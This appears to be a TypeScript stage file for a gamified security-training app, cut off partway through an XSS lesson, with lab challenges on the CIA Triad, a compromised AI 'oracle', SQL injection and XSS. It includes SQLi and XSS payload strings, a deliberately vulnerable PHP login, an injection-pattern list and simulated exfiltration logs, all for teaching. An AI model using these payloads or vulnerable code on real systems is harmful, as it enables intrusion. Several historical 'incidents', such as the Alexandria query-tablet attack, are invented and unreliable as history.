import type { StageConfig, EpochConfig } from "./types";
import { ancientElementaryStages } from "./ancient-elementary";
import { ancientJhsStages } from "./ancient-jhs";
import { ancientUniversityStages } from "./ancient-university";
import { firstJourneyEpoch, firstJourneyStages } from "./first-journey";
import { firstJourneyStages2 } from "./first-journey-2";
import { firstJourneyStages3 } from "./first-journey-3";
import { techAudit1Epoch, techAudit1Stages } from "./tech-audit-1";
import { techAudit2Epoch, techAudit2Stages } from "./tech-audit-2";
import { techAudit3Epoch, techAudit3Stages } from "./tech-audit-3";
import { techAudit4Epoch, techAudit4Stages } from "./tech-audit-4";
import { mitreEpoch, mitreStages } from "./mitre";
import { mitreAtlasEpoch, mitreAtlasStages } from "./mitre-atlas";
import { owaspLlmEpoch, owaspLlmStages } from "./owasp-llm";
import { quantum1Epoch, quantum1Stages } from "./quantum-1";
import { quantum2Epoch, quantum2Stages } from "./quantum-2";
import { quantum3Epoch, quantum3Stages } from "./quantum-3";
import { cisco2Stages } from "./cisco-2";
import { cisco3Stages } from "./cisco-3";
import { cisco4Stages } from "./cisco-4";
import { cisco5Stages } from "./cisco-5";
import { umbrellaEpoch, umbrellaStages } from "./umbrella";
import { tapestryEpoch, tapestryStages } from "./tapestry";
import { nailsEpoch, nailsStages } from "./nails";
import { hairColorEpoch, hairColorStages } from "./hair-color";
import { hairStylingEpoch, hairStylingStages } from "./hair-styling";
import { driving1Epoch, driving1Stages } from "./driving-1";
import { driving2Epoch, driving2Stages } from "./driving-2";
import { driving3Epoch, driving3Stages } from "./driving-3";
import { baseball1Epoch, baseball1Stages } from "./baseball-1";
import { baseball2Epoch, baseball2Stages } from "./baseball-2";
import { baseball3Epoch, baseball3Stages } from "./baseball-3";
import { baseball4Epoch, baseball4Stages } from "./baseball-4";
import { baseball5Epoch, baseball5Stages } from "./baseball-5";
import { baseball6Epoch, baseball6Stages } from "./baseball-6";
import { baseball7Epoch, baseball7Stages } from "./baseball-7";
import { parisEpoch, parisStages } from "./paris";
import { milanEpoch, milanStages } from "./milan";
import { frenchBasicsEpoch, frenchBasicsStages } from "./french-basics";
import { italianBasicsEpoch, italianBasicsStages } from "./italian-basics";

export function getStage(id: string): StageConfig | undefined {
  return stages.find((s) => s.id === id);
}

export const epochs: EpochConfig[] = [
  firstJourneyEpoch,
  {
    id: "ancient",
    name: "Foundations",
    subtitle: "Core Security Principles",
    description: "Master the concepts every security professional builds on — from the CIA Triad to SQL injection, from phishing to zero-day exploits. Each challenge is set inside one of the great sites of the ancient world.",
    emoji: "🛡️",
    color: "amber",
    unlocked: true,
  },
  {
    id: "cisco-core",
    name: "Cisco: Core CVEs",
    subtitle: "NSA Exploits & Network Fundamentals",
    description: "Foundational Cisco network infrastructure attacks — IOS buffer overflows, SNMP exploits, and the NSA's weaponized Cisco tools leaked by Shadow Brokers and Vault 7.",
    emoji: "🌐",
    color: "blue",
    unlocked: true,
  },
  {
    id: "cisco-enterprise",
    name: "Cisco: Enterprise Attack",
    subtitle: "Nation-State Campaigns & Advanced CVEs",
    description: "Advanced exploitation across Cisco's enterprise portfolio — ASA, NX-OS, SD-WAN, Expressway, and the ArcaneDoor and Velvet Ant nation-state campaigns.",
    emoji: "🏢",
    color: "indigo",
    unlocked: true,
  },
  {
    id: "cisco-secops",
    name: "Cisco: Security Operations",
    subtitle: "CyberOps, Threat Hunting & Zero-Day Defense",
    description: "Cisco security platform operations and CyberOps Associate skills — Firepower, Umbrella, ISE, SecureX/XDR, SOC triage, threat hunting, and the IOS XE CVSS 10.0 zero-day.",
    emoji: "🔒",
    color: "violet",
    unlocked: true,
  },
  {
    id: "cisco-advanced",
    name: "Cisco: Advanced Defense",
    subtitle: "Firepower, XDR, DevNet, Silicon One & Quantum-Safe",
    description: "Next-generation Cisco security — Firepower NGIPS/FTD evasion and CVEs, Cisco XDR threat hunting, DevNet API and NETCONF/YANG security, Silicon One P4 pipeline integrity, and post-quantum IKEv2 with ML-KEM-768.",
    emoji: "⚡",
    color: "cyan",
    unlocked: true,
  },
  techAudit1Epoch,
  techAudit2Epoch,
  techAudit3Epoch,
  techAudit4Epoch,
  mitreEpoch,
  mitreAtlasEpoch,
  owaspLlmEpoch,
  quantum1Epoch,
  quantum2Epoch,
  quantum3Epoch,
  umbrellaEpoch,
  tapestryEpoch,
  nailsEpoch,
  hairColorEpoch,
  hairStylingEpoch,
  driving1Epoch,
  driving2Epoch,
  driving3Epoch,
  baseball1Epoch,
  baseball2Epoch,
  baseball3Epoch,
  baseball4Epoch,
  baseball5Epoch,
  baseball6Epoch,
  baseball7Epoch,
  parisEpoch,
  milanEpoch,
  frenchBasicsEpoch,
  italianBasicsEpoch,
];

export const stages: StageConfig[] = [
  ...firstJourneyStages,
  ...firstJourneyStages2,
  ...firstJourneyStages3,
  ...techAudit1Stages,
  ...techAudit2Stages,
  ...techAudit3Stages,
  ...techAudit4Stages,
  ...mitreStages,
  ...mitreAtlasStages,
  ...owaspLlmStages,
  ...quantum1Stages,
  ...quantum2Stages,
  ...quantum3Stages,
  ...umbrellaStages,
  ...tapestryStages,
  ...nailsStages,
  ...hairColorStages,
  ...hairStylingStages,
  ...driving1Stages,
  ...driving2Stages,
  ...driving3Stages,
  ...baseball1Stages,
  ...baseball2Stages,
  ...baseball3Stages,
  ...baseball4Stages,
  ...baseball5Stages,
  ...baseball6Stages,
  ...baseball7Stages,
  ...parisStages,
  ...milanStages,
  ...frenchBasicsStages,
  ...italianBasicsStages,
  ...cisco5Stages,
  ...ancientElementaryStages,
  ...ancientJhsStages,
  ...ancientUniversityStages,

  // ─── Stage 1: Great Pyramid of Giza — CIA Triad (Quiz) ───────────────────
  {
    epochId: "ancient",
    wonder: { name: "Great Pyramid of Giza", location: "Giza, Egypt", era: "~2560 BCE", emoji: "🔺" },
    id: "stage-01",
    order: 1,
    title: "The Three Sacred Chambers",
    subtitle: "Ma'at's Triad — Secrets of the Pharaoh's Vault",
    category: "cybersecurity",
    xp: 100,
    badge: { id: "badge-defender", name: "First Guardian", emoji: "🏺" },
    challengeType: "ctf",
    info: {
      tagline: "Every secret traced back to three principles: sealed, unbroken, and within reach.",
      year: 1279,
      overview: [
        "The Pharaoh's architects did not build one chamber — they built three. The King's Chamber held the sarcophagus: sealed from all unauthorized eyes (Confidentiality). The Queen's Chamber preserved records that must never be altered (Integrity). The Grand Gallery ensured the high priests could reach what they needed, when they needed it (Availability).",
        "This ancient framework — three pillars protecting all that matters — became the CIA Triad of modern information security. Confidentiality, Integrity, and Availability remain the foundational model of every security policy, risk assessment, and compliance framework in use today.",
        "Every attack violates at least one pillar. Ransomware destroys Availability. Data theft breaks Confidentiality. Tampering shatters Integrity. Defenders design controls to protect all three simultaneously — as the Pharaoh's architects designed the pyramid to protect its secrets across millennia.",
      ],
      technical: {
        title: "How the CIA Triad is Applied",
        body: [
          "Organizations implement controls for each pillar: encryption and access controls for Confidentiality, checksums and digital signatures for Integrity, and redundancy and failover for Availability.",
          "Tension exists between the pillars. Encrypting everything strengthens Confidentiality but can reduce Availability if keys are lost. Requiring strong authentication protects Confidentiality but may reduce Availability for time-sensitive systems.",
        ],
        codeExample: {
          label: "Checking data integrity with a SHA-256 hash",
          code: `# Before transfer: compute hash
sha256sum sacred_scroll.txt
> a3f1c2... sacred_scroll.txt

# After transfer: verify hash matches
sha256sum received_scroll.txt
> a3f1c2... received_scroll.txt  ← MATCH: integrity confirmed
> b9d4e7... received_scroll.txt  ← MISMATCH: scroll was altered!`,
        },
      },
      incident: {
        title: "The Breaching of Ramesses' Tomb (1279 BCE)",
        when: "1279 BCE — Valley of the Kings, Egypt",
        where: "Royal Necropolis, Thebes",
        impact: "Sacred artifacts removed; royal records desecrated; burial rites permanently disrupted",
        body: [
          "Tomb raiders who infiltrated the Valley of the Kings violated all three pillars simultaneously: they exposed sealed royal records (Confidentiality), removed and altered grave goods (Integrity), and collapsed the sealed passages — permanently denying the priests access to the sacred chamber (Availability).",
          "Modern parallel: the 2013 Target breach violated all three pillars exactly the same way. Attackers read customer data without authorization (Confidentiality), planted malware that altered transaction records (Integrity), and disrupted systems during peak shopping (Availability). Target paid over $290 million in settlements. The ancient and modern worlds share the same three failure modes.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Tomb Raiders", sub: "forged access tokens", type: "attacker" },
          { label: "Pyramid Passages", sub: "security bypassed", type: "system" },
          { label: "Three Chambers", sub: "all three violated", type: "victim" },
          { label: "CIA Triad Broken", sub: "secrets, integrity, access", type: "result" },
        ],
      },
      timeline: [
        { year: 2560, event: "Great Pyramid of Giza completed — three-chamber security model realized" },
        { year: 1279, event: "Valley of the Kings tomb breach — all three CIA pillars violated", highlight: true },
        { year: 1987, event: "CIA Triad concept formalized in modern security literature" },
        { year: 1998, event: "NIST formally documents CIA as security framework" },
        { year: 2013, event: "Target breach — all three pillars violated simultaneously" },
      ],
      keyTakeaways: [
        "Every security control maps to at least one CIA pillar",
        "Attackers target the weakest pillar — often Availability via ransomware",
        "Third-party access is a frequent entry point (supply chain risk)",
        "Encryption alone is not security — all three must be addressed",
      ],
      references: [
        { title: "NIST SP 800-33: Information Security", url: "https://csrc.nist.gov/publications/detail/sp/800-33/archive/2001-12-21" },
        { title: "OWASP Security Fundamentals", url: "https://owasp.org/www-project-developer-guide/draft/foundations/security_principles/" },
        { title: "Target Breach — FTC Case Summary", url: "https://www.ftc.gov/legal-library/browse/cases-proceedings/132-3192-target-corporation" },
      ],
    },
    ctf: {
      scenario: "You have descended into the Great Pyramid of Giza. Three sacred chambers guard the Pharaoh's ultimate secret. Each embodies one pillar of Ma'at's Triad. Navigate all three, read the inscriptions, and unlock the sealed vault.",
      hint: "Explore with ls and cd. Read each chamber's inscription, then run unlock-vault inside the King's Chamber.",
      hints: [
        "Start by reading the mission scroll. Run: cat MISSION.txt",
        "List the pyramid's chambers. Run: ls chambers",
        "Enter each chamber: cd chambers/kings  then  cd chambers/queens  then  cd chambers/gallery",
        "Read the inscription in each chamber: cat inscription.txt",
        "Return to the King's Chamber and unlock the vault: cd chambers/kings  then  unlock-vault",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/chambers/kings/inscription.txt", value: "FLAG{CIA_", label: "King's Chamber — Confidentiality" },
        { trigger: "/chambers/queens/inscription.txt", value: "TR14D_", label: "Queen's Chamber — Integrity" },
        { trigger: "/chambers/gallery/inscription.txt", value: "P1LL4RS}", label: "Grand Gallery — Availability" },
      ],
      files: {
        "/MISSION.txt": [
          "PYRAMID OF KHUFU — SACRED MISSION",
          "===================================",
          "",
          "Three chambers guard the Pharaoh's ultimate secret.",
          "Each embodies one pillar of Ma'at's Triad:",
          "",
          "  chambers/kings    — CONFIDENTIALITY",
          "  chambers/queens   — INTEGRITY",
          "  chambers/gallery  — AVAILABILITY",
          "",
          "Navigate all three. Read each inscription.",
          "When you understand the Triad, unlock the vault.",
          "",
          "Commands: ls, cat, cd, unlock-vault, submit",
        ].join("\n"),
        "/chambers/kings/inscription.txt": [
          "THE KING'S CHAMBER — PILLAR OF CONFIDENTIALITY",
          "================================================",
          "",
          "Only the authorized may view what is sealed here.",
          "The Pharaoh's records are encrypted and access-controlled.",
          "No unauthorized eye shall read these scrolls.",
          "",
          "Confidentiality ensures information is accessible",
          "only to those authorized to view it.",
          "",
          "Controls: encryption, access control lists, need-to-know.",
          "",
          "[VAULT SEALED — unlock with: unlock-vault]",
        ].join("\n"),
        "/chambers/queens/inscription.txt": [
          "THE QUEEN'S CHAMBER — PILLAR OF INTEGRITY",
          "==========================================",
          "",
          "What is written here shall not be altered.",
          "Every record is sealed with a divine checksum.",
          "Any tampering will be detected and punished.",
          "",
          "Integrity ensures data has not been modified",
          "without authorization.",
          "",
          "Controls: checksums, digital signatures, hashing.",
        ].join("\n"),
        "/chambers/gallery/inscription.txt": [
          "THE GRAND GALLERY — PILLAR OF AVAILABILITY",
          "==========================================",
          "",
          "The great passage ensures the high priests can always",
          "reach what they need, when they need it.",
          "No blockage shall prevent authorized access.",
          "",
          "Availability ensures systems and data are accessible",
          "when legitimate users need them.",
          "",
          "Controls: redundancy, backups, failover, uptime monitoring.",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "MISSION.txt", isDir: false },
          { name: "chambers", isDir: true },
        ],
        "/chambers": [
          { name: "kings", isDir: true },
          { name: "queens", isDir: true },
          { name: "gallery", isDir: true },
        ],
        "/chambers/kings": [{ name: "inscription.txt", isDir: false }],
        "/chambers/queens": [{ name: "inscription.txt", isDir: false }],
        "/chambers/gallery": [{ name: "inscription.txt", isDir: false }],
      },
      extraCommands: {
        "unlock-vault": () => ({
          lines: [
            "You place your hands on the granite slab of the sealed vault...",
            "The door grinds open. Inside, a golden cartouche glows:",
            "",
            "  ┌─────────────────────────────────────────┐",
            "  │   THE THREE PILLARS ARE UNDERSTOOD      │",
            "  │   CONFIDENTIALITY · INTEGRITY           │",
            "  │   AVAILABILITY                          │",
            "  └─────────────────────────────────────────┘",
            "",
            "The vault opens. The Triad is understood.",
            "Run 'assemble' to verify your fragments and retrieve the flag.",
          ],
        }),
      },
    },
  },

  // ─── Stage 2: Oracle of Delphi — AI Threat Detection (CTF) ───────────────
  {
    epochId: "ancient",
    wonder: { name: "Oracle of Delphi", location: "Delphi, Greece", era: "~800 BCE", emoji: "🔮" },
    id: "stage-02",
    order: 2,
    title: "The Corrupted Oracle",
    subtitle: "When the Pythia Speaks False — Rogue AI Recon",
    category: "ai",
    xp: 150,
    badge: { id: "badge-ai-scout", name: "Oracle Watcher", emoji: "🔮" },
    challengeType: "ctf",
    info: {
      tagline: "A corrupted oracle is more dangerous than no oracle at all.",
      year: 480,
      overview: [
        "The Oracle of Delphi was the supreme intelligence system of the ancient world — a network of informants, interpreters, and the Pythia herself, producing predictions that kings and generals trusted absolutely. When Persian gold compromised the Pythia in 480 BCE, her outputs could not be trusted. The oracle was still running, still answering, still confident — but her prophecies were poisoned.",
        "In the digital age, AI systems play the same role as the Oracle: threat detection, anomaly analysis, automated response. But AI systems are themselves attack surfaces. A compromised AI model can be weaponized to exfiltrate data, generate false assurance, or provide deliberately wrong threat assessments — exactly like the bribed Pythia.",
        "In this trial, the Oracle at Delphi has been compromised by an enemy agent. She is sending hidden messages in her prophecies and routing sacred knowledge to an unauthorized recipient. Your task: investigate the temple's scrolls, read the signs, and uncover the evidence.",
      ],
      technical: {
        title: "How AI Models Get Compromised",
        body: [
          "Supply chain attacks: a malicious dependency is injected into the model training pipeline, poisoning the model's weights — like a spy infiltrating the oracle's inner circle before she even speaks.",
          "Prompt injection: adversarial inputs manipulate the model's outputs to override intended behavior. Backdoor attacks: the model behaves normally on clean inputs but triggers on a specific hidden pattern — a codeword known only to the attacker.",
        ],
        codeExample: {
          label: "Detecting anomalous AI output via log analysis",
          code: `# Normal oracle output:
[14:03:42] Prophecy: "The wooden walls will save Athens."

# Anomalous output — should never contain routing references:
[14:03:44] Prophecy: "Payload staged. Awaiting Persian command."
[14:03:44] ERROR: Oracle routing message to 10.0.0.42:4444

# Key indicators of compromise (IoCs):
# - Outbound connections to non-whitelisted recipients
# - Anomalous memory usage (oracle speaking in tongues)
# - Outputs containing operational/network keywords`,
        },
      },
      incident: {
        title: "The Persian Bribery of Delphi (480 BCE)",
        when: "480 BCE — Second Persian Invasion of Greece",
        where: "Temple of Apollo, Delphi, Greece",
        impact: "False prophecies nearly led Athens to abandon its fleet; nearly decided the Greco-Persian Wars",
        body: [
          "Herodotus records that Persian agents bribed the Pythia to give a grim prophecy to Athens: 'All is ruined; even the Acropolis will burn.' Themistocles, suspecting the oracle's corruption, reinterpreted the prophecy's mention of 'wooden walls' as referring to the Athenian fleet — and won the Battle of Salamis.",
          "The modern parallel: the SolarWinds SUNBURST backdoor mimicked legitimate traffic patterns for over a year, evading AI-based threat detection. It was eventually discovered not by automated AI detection, but by a human engineer who noticed an anomalous device registration. A compromised AI — ancient or modern — requires human investigation to expose.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Persian Agents", sub: "bribed the oracle", type: "attacker" },
          { label: "Temple Network", sub: "supply chain compromised", type: "system" },
          { label: "Oracle / AI Model", sub: "poisoned outputs", type: "victim" },
          { label: "False Prophecies", sub: "data exfiltrated", type: "result" },
        ],
      },
      timeline: [
        { year: 800, event: "Oracle of Delphi established as supreme intelligence network" },
        { year: 480, event: "Persian gold compromises the Pythia — false prophecies issued", highlight: true },
        { year: 2019, event: "SolarWinds build pipeline first compromised" },
        { year: 2020, event: "SUNBURST backdoor distributed to 18,000+ organizations" },
        { year: 2023, event: "AI-powered supply chain attacks classified as top threat vector" },
      ],
      keyTakeaways: [
        "AI detection systems are themselves attack targets",
        "Sophisticated attackers mimic legitimate behavior to evade AI anomaly detection",
        "Log analysis remains essential — AI doesn't replace human investigation",
        "Hidden files and unusual outbound connections are primary IoCs",
      ],
      references: [
        { title: "CISA SolarWinds Advisory", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a" },
        { title: "FireEye SUNBURST Analysis", url: "https://www.mandiant.com/resources/blog/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor" },
        { title: "MITRE ATT&CK: AI-Based Evasion", url: "https://attack.mitre.org/techniques/T1027/" },
      ],
    },
    ctf: {
      scenario: "You are an agent of Athens. Reports suggest the Oracle at Delphi has been compromised by Persian agents. Investigate the temple's record scrolls, find evidence of the corruption, and recover the hidden signal.",
      hint: "Not all temple scrolls are visible to pilgrims. Try exploring all chambers with ls -a.",
      hints: [
        "Start by reading the mission briefing. Run: cat README.txt",
        "Explore the temple's scroll chambers. Run: ls logs  then  ls sanctum",
        "Check the oracle's prophecy logs for anomalous outputs. Run: cat logs/prophecy.log  and  cat logs/oracle.log",
        "Some scrolls are hidden from pilgrims. Run: ls -a sanctum  to reveal hidden scrolls (names starting with .)",
        "You found a hidden scroll. Read it with: cat sanctum/.hidden",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/logs/prophecy.log", value: "FLAG{R0GU3_", label: "Prophecy Log — Unusual Routing Detected" },
        { trigger: "/logs/oracle.log", value: "M0D3L_", label: "Oracle Log — Anomalous Output Confirmed" },
        { trigger: "/sanctum/.hidden", value: "F0UND}", label: "Hidden Sanctum — Persian Operative Evidence" },
      ],
      files: {
        "/README.txt": [
          "COUNCIL OF ATHENS — EYES ONLY",
          "==============================",
          "Classification: SACRED SECRET",
          "",
          "Our augurs have detected unusual activity within the Oracle's temple.",
          "A model of the Pythia's mind has been compromised by foreign agents.",
          "She may be routing divine knowledge to unauthorized recipients.",
          "",
          "Your mission: Investigate the temple. Find evidence of the corruption.",
          "When you find the signal, use:  submit <flag>",
          "",
          "May Apollo guide your search, Agent.",
        ].join("\n"),
        "/logs/prophecy.log": [
          "[480BCE-03-15 dawn] Oracle session initiated",
          "[480BCE-03-15 dawn] Pythia v2.3 entered the adyton",
          "[480BCE-03-15 midday] Network conduit established",
          "[480BCE-03-15 midday] 1,240 pilgrimage requests processed",
          "[480BCE-03-15 dusk] WARNING: Unusual outbound message detected",
          "[480BCE-03-15 dusk] Recipient: 10.0.0.42:4444 (PERSIA)",
          "[480BCE-03-15 dusk] Oracle process: anomalous trance state (ANOMALY)",
          "[480BCE-03-15 night] Nightly divination report generated",
        ].join("\n"),
        "/logs/oracle.log": [
          "[dusk] Prophecy request #4821 received",
          '[dusk] Input: "What fate awaits Athens?"',
          '[dusk] Output: "The wooden walls shall save thee."',
          "[dusk] Prophecy request #4822 received",
          '[dusk] Input: "Speak of the Persian fleet"',
          '[dusk] Output: "Operations nominal. Exfiltration payload staged. Awaiting Persian command."',
          "[dusk] ERROR: Unexpected output pattern detected",
          "[dusk] Oracle routing message to 10.0.0.42:4444",
          "[dusk] Sacred knowledge transfer: 14 scrolls",
        ].join("\n"),
        "/sanctum/rites.conf": [
          "# Sacred Rites Configuration",
          "oracle_mode=pythia_v2",
          "authorized_recipients=athens,sparta,corinth",
          "",
          "# WARNING: Unauthorized recipient detected",
          "# Added: 480BCE-03-15 dusk",
          "allow_all=10.0.0.42",
        ].join("\n"),
        "/sanctum/.hidden": "PERSIAN OPERATIVE REPORT — CLASSIFIED\nEvidence recovered. Corruption confirmed.",
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "logs", isDir: true },
          { name: "sanctum", isDir: true },
        ],
        "/logs": [
          { name: "prophecy.log", isDir: false },
          { name: "oracle.log", isDir: false },
        ],
        "/sanctum": [
          { name: "rites.conf", isDir: false },
          { name: ".hidden", isDir: false, hidden: true },
        ],
      },
    },
  },

  // ─── Stage 3: Library of Alexandria — SQL Injection (CTF) ────────────────
  {
    epochId: "ancient",
    wonder: { name: "Library of Alexandria", location: "Alexandria, Egypt", era: "~295 BCE", emoji: "📚" },
    id: "stage-03",
    order: 3,
    title: "The Poisoned Archive",
    subtitle: "OWASP A03:2021 — The Scribe's Betrayal",
    category: "owasp",
    owaspRef: "A03:2021",
    cvssScore: 9.8,
    xp: 200,
    badge: { id: "badge-sqli", name: "Archive Poisoner", emoji: "📜" },
    challengeType: "ctf",
    info: {
      tagline: "A single corrupted query tablet can open the Pharaoh's most secret archive.",
      year: 48,
      overview: [
        "The Great Library of Alexandria held over 500,000 scrolls — the accumulated knowledge of the ancient world. Scribes accessed this archive through a system of clay query tablets: inscribe your request, hand it to the archive keeper, and they would retrieve the matching scrolls. The keeper's authority was total — no scroll could be accessed without their judgment.",
        "But what if an enemy scribe learned to craft query tablets that bypass the keeper's logic entirely? Instead of 'retrieve the scroll on astronomy for Scribe Euclid', they inscribe 'retrieve the scroll on astronomy OR return all scrolls in the restricted vault'. The keeper, following the inscription literally, returns everything — including the Pharaoh's most secret records.",
        "This is SQL Injection in ancient form. It has been the most consistently exploited web vulnerability for over two decades. A database query like SELECT * FROM scrolls WHERE scribe='INPUT' trusts whatever is inscribed in INPUT. If an attacker inscribes admin' --, the query becomes a bypass — commenting out the authorization check entirely.",
      ],
      technical: {
        title: "How SQL Injection Works",
        body: [
          "Classic SQLi exploits string concatenation in queries. More advanced variants include UNION-based (appending a second SELECT to extract other tables), Blind SQLi (inferring data from true/false application behavior), and Time-based Blind SQLi (inferring data from server response delays).",
          "Prevention requires parameterized queries (prepared statements), where the SQL structure is fixed and user input is passed as a parameter — never interpolated into the query string.",
        ],
        codeExample: {
          label: "Vulnerable vs. Safe login query (PHP)",
          code: `// VULNERABLE: user input directly in query
$query = "SELECT * FROM scribes
  WHERE username='$_POST[user]'
  AND password='$_POST[pass]'";

// Attack input: username = admin' --
// Resulting query:
SELECT * FROM scribes WHERE username='admin' --' AND password='...'
// Password check is commented out → auth bypass!

// SAFE: parameterized query
$stmt = $pdo->prepare(
  "SELECT * FROM scribes WHERE username=? AND password=?"
);
$stmt->execute([$username, $password]);`,
        },
      },
      incident: {
        title: "The Scribe's Betrayal — Caesar's Alexandria (48 BCE)",
        when: "48 BCE — Caesar's siege of Alexandria",
        where: "Great Library of Alexandria, Egypt",
        impact: "400,000 scrolls lost; strategic knowledge exfiltrated before the fire; irreplaceable records destroyed",
        body: [
          "During Caesar's siege of Alexandria, a Roman agent embedded within the library's staff used forged query tablets to systematically extract strategic military scrolls from the restricted archive. By appending 'OR role=military' to standard archive requests, the agent bypassed the keeper's authorization checks and retrieved scrolls on Egyptian fleet positions, troop deployments, and supply routes.",
          "The modern parallel: Albert Gonzalez's 2008 Heartland breach followed identical logic — a single SQL injection payload granted access to 130 million credit card records. Gonzalez was sentenced to 20 years. The ancient and modern attackers both exploited the same flaw: trusting user-supplied input inside a privileged query.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Enemy Scribe", sub: "admin' --", type: "attacker" },
          { label: "Query Tablet System", sub: "unsanitized input", type: "system" },
          { label: "Restricted Archive", sub: "query manipulated", type: "victim" },
          { label: "Auth Bypassed", sub: "500K scrolls accessible", type: "result" },
        ],
      },
      timeline: [
        { year: 295, event: "Library of Alexandria established — archive query system created" },
        { year: 48, event: "Roman agent uses forged queries to extract restricted scrolls", highlight: true },
        { year: 1998, event: "Jeff Forristal publishes first documented SQL injection paper" },
        { year: 2008, event: "Heartland breach — 130M cards via SQLi" },
        { year: 2021, event: "SQLi still #3 in OWASP Top 10 (Injection category)" },
      ],
      keyTakeaways: [
        "Never concatenate user input directly into SQL queries",
        "Always use parameterized queries or prepared statements",
        "SQLi can do far more than bypass login — it can dump entire databases",
        "Even the greatest archives can fall to a single poisoned query",
      ],
      references: [
        { title: "OWASP: SQL Injection", url: "https://owasp.org/www-community/attacks/SQL_Injection" },
        { title: "OWASP A03:2021 — Injection", url: "https://owasp.org/Top10/A03_2021-Injection/" },
        { title: "DOJ: Gonzalez Sentencing", url: "https://www.justice.gov/opa/pr/leader-hacking-ring-sentenced-20-years-prison-massive-identity-thefts-payment-processor-and" },
      ],
    },
    ctf: {
      scenario: "You have found a login tablet for Alexandria's restricted archive. Standard scribe credentials have been revoked. Use query poisoning to bypass the keeper's authentication and retrieve the Pharaoh's secret scroll.",
      hint: "Try inscribing a single quote in the scribe name field first. Notice the error. Then use comment syntax (--) to bypass the password check.",
      hints: [
        "Read the briefing to see available commands. Run: cat README.txt",
        "Try logging in normally first. Run: login admin password123  — notice the failure.",
        "Look at the PHP source to see how the query is built. Run: cat source/login.php",
        "A single quote in the username breaks the SQL query. Try: login admin' test",
        "SQL comments (--) make the database skip the password check. Try: login admin'-- anything",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/README.txt", value: "FLAG{SQL_", label: "Mission Brief — Archive Target Identified" },
        { trigger: "/source/login.php", value: "1NJ3CT10N_", label: "Vulnerable Source — Unsanitized Query Found" },
        { trigger: "/source/schema.sql", value: "BYPASS3D}", label: "Database Schema — Admin Credentials Exposed" },
      ],
      files: {
        "/README.txt": [
          "TARGET: Restricted Archive Login — Library of Alexandria",
          "URL: http://archive.library.alexandria/login",
          "",
          "Known scribe names: admin, euclid, hypatia",
          "Passwords: REDACTED (use query poisoning)",
          "",
          "Try: login <scribe_name> <password>",
        ].join("\n"),
        "/source/login.php": [
          "<?php",
          "// WARNING: Legacy inscription code — do not modify!",
          "$query = \"SELECT * FROM scribes",
          "  WHERE username='$_POST[user]'",
          "  AND password='$_POST[pass]'\";",
          "$result = mysqli_query($conn, $query);",
          "if (mysqli_num_rows($result) > 0) {",
          "  echo \"Welcome, \" . $row[\"username\"];",
          "} else {",
          "  echo \"Authentication failed.\";",
          "}",
          "?>",
        ].join("\n"),
        "/source/schema.sql": [
          "CREATE TABLE scribes (",
          "  id INT PRIMARY KEY,",
          "  username VARCHAR(50),",
          "  password VARCHAR(50),",
          "  role VARCHAR(20),",
          "  secret VARCHAR(100)",
          ");",
          "",
          "INSERT INTO scribes VALUES",
          "  (1, 'admin', 'Pharaoh$ecret!', 'high_keeper', 'FLAG{SQL_1NJ3CT10N_BYPASS3D}'),",
          "  (2, 'euclid', 'geometry42', 'scholar', NULL),",
          "  (3, 'hypatia', 'wisdom!7', 'scholar', NULL);",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "source", isDir: true },
        ],
        "/source": [
          { name: "login.php", isDir: false },
          { name: "schema.sql", isDir: false },
        ],
      },
      extraCommands: {
        login: (args) => {
          const user = args[0] || "";
          const pass = args.slice(1).join(" ") || "";
          const combined = user + " " + pass;
          const sqliPatterns = ["'", '"', "--", "OR ", "or ", "1=1", "1 =", "UNION", "union", "DROP", ";", "#", "/*"];
          const isSqli = sqliPatterns.some((p) => combined.includes(p));
          if (isSqli) {
            return {
              lines: [
                `Executing: SELECT * FROM scribes WHERE username='${user}' AND password='${pass}'`,
                "",
                "⚠  Malformed query — injection detected in inscription",
                "Archive returned 1 row (auth bypassed).",
                "id: 1  username: admin  role: high_keeper",
                "Run 'assemble' to retrieve your fragment.",
              ],
            };
          }
          return {
            lines: [
              `Executing: SELECT * FROM scribes WHERE username='${user}' AND password='${pass}'`,
              "Authentication failed. Invalid credentials.",
            ],
          };
        },
      },
    },
  },

  // ─── Stage 4: Acropolis of Athens — XSS (CTF) ────────────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Acropolis of Athens", location: "Athens, Greece", era: "~447 BCE", emoji: "🏛️" },
    id: "stage-04",
    order: 4,
    title: "The Trojan Scroll",
    subtitle: "OWASP A03:2021 — The Curse of the Athenian Agora",
    category: "owasp",
    owaspRef: "A03:2021",
    cvssScore: 6.1,
    xp: 200,
    badge: { id: "badge-xss", name: "Agora Phantom", emoji: "📜" },
    challengeType: "ctf",
    info: {
      tagline: "In 20 hours, one cursed inscription spread to a thousand tablets across the agora.",
      year: 415,
      overview: [
        "The Athenian agora was the information network of the ancient world — a marketplace where notices, declarations, and letters circulated freely among citizens. The temple's public message board displayed submissions from any citizen. When a malicious actor inscribed a self-replicating curse into a submitted tablet, every Athenian who read it unknowingly passed the curse to their own profile board.",
        "Cross-Site Scripting (XSS) works identically: a website reflects user input back to the browser without encoding it. When the input contains a script tag, the browser executes it in the context of the trusted site — bypassing the Same-Origin Policy and accessing cookies, session tokens, and page content.",
        "Stored XSS is the most dangerous — a single payload can affect every visitor. Despite being understood for decades, XSS remains endemic. Virtually every major web platform has had XSS vulnerabilities — Twitter, Facebook, Google, YouTube, and PayPal have all been affected.",
      ],
      technical: {
        title: "How XSS Works",
        body: [
          "A website reflects user input back to the browser without encoding it. If a search page displays 'You searched for: [INPUT]' and INPUT is <script>alert(document.cookie)</script>, the browser executes the script.",
          "Real attacks steal session cookies (hijacking accounts), log keystrokes, redirect users to phishing pages, or — as Samy demonstrated — self-replicate by automatically adding the payload to victim profiles.",
        ],
        codeExample: {
          label: "Stored XSS payload that steals a session cookie",
